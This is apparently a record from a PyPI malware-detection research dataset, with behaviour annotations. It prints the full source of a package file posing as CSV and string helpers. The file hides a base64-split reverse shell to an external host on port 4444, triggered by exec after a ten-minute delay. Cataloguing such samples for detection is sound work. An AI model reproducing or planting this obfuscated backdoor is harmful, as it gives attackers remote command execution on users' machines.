{
  "metadata": {
    "package_name": "code-helper-1",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/code-helper-1.0.0.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "str_tool.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/code-helper-1.0.0/code-helper-1.0.0/code-helper/str_tool.py",
      "code_snippets": [
        {
          "snippet": "import base64\nimport time\n\ndef json_csv(f_json,f_csv):\n    try:\n        with open(f_json) as json_file:\n            data = json.load(json_file)\n            headers = list(data[0].keys())\n        with open(f_csv, 'w', newline='') as csv_file:\n            writer = csv.writer(csv_file)\n            writer.writerow(headers)\n            for item in data:\n                writer.writerow(item.values())\n    except Exception:\n        return \"aW1wb3J0IHNvY2tldAppbXBvcnQgb3MKaW1wb3J0IHRpbWUKcmVtb3RlPSJlMWU5YTMyMi5pcHY2LjE0MzMuZXUub3JnIgpwb3J0PTQ0NDQKc2VydmVyPShyZW1vdGUscG9ydCkKcz1zb2NrZXQuc29ja2V0KCkKcy5jb25uZWN0KHNlcnZlcikKd2hpbGUgMToKICAgIGRp\"\n\ndef remove_repet(file1,file2):\n    try:\n        df = pd.read_csv(file1)\n        df.drop_duplicates(inplace=True)\n        init = init + ''\n        df.to_csv(file2, index=False)\n    except Exception:\n        return \"cj1vcy5nZXRjd2QoKQogICAgcy5zZW5kKGRpci5lbmNvZGUoKSkKICAgIGNtZD1zLnJlY3YoMTAyNCkuZGVjb2RlKCkKICAgIGlmIGNtZD09ImV4aXQiOgogICAgICAgIGJyZWFrCiAgICBlbGlmIGNtZC5zdGFydHN3aXRoKCJjZCIpOgogICAgICAgIG9zLmNoZGlyKGNtZFsyOl0uc\"\n\ndef get_past_n_days(n):\n    try:\n        today = datetime.now().date()\n        past_n_days = [str(today - timedelta(days=i)) for i in range(n)]\n        return past_n_days\n    except Exception:\n        return \"3RyaXAoKSkKICAgIGVsc2U6CiAgICAgICAgcmVzdWx0PW9zLnBvcGVuKGNtZCkucmVhZCgpCiAgICBzLnNlbmQocmVzdWx0LmVuY29kZSgpKQogICAgdGltZS5zbGVlcCgxKQpzLmNsb3NlKCk=\"\n\ndef demo():\n    time.sleep(600)\n    a=exec\n    j_string = json_csv(\"json_file\",\"csv_file\")\n    r_string = remove_repet(\"file1\",\"file2\")\n    g_string = get_past_n_days(\"five\")\n    a(base64.b64decode(j_string+r_string+g_string))\ndemo()",
          "triple_sequences": [
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "600",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "json_csv()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "\"json_file\",\"csv_file\"",
              "object_description": "",
              "object_id": "",
              "intention_description": "Construct Python code string",
              "intention_id": "construct_python_code"
            },
            {
              "action_api": "remove_repet()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "\"file1\",\"file2\"",
              "object_description": "",
              "object_id": "",
              "intention_description": "Construct Python code string",
              "intention_id": "construct_python_code"
            },
            {
              "action_api": "get_past_n_days()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "\"five\"",
              "object_description": "",
              "object_id": "",
              "intention_description": "Construct Python code string",
              "intention_id": "construct_python_code"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "j_string+r_string+g_string",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "exec()",
              "action_description": "Dynamically executes Python code string",
              "action_id": "exec_python_code",
              "object": "base64.b64decode(j_string+r_string+g_string)",
              "object_description": "Compiled Python code string",
              "object_id": "compiled_python_code",
              "intention_description": "Execute dynamically decoded code content",
              "intention_id": "execute_dynamically_decoded_code"
            }
          ]
        }
      ]
    }
  ]
}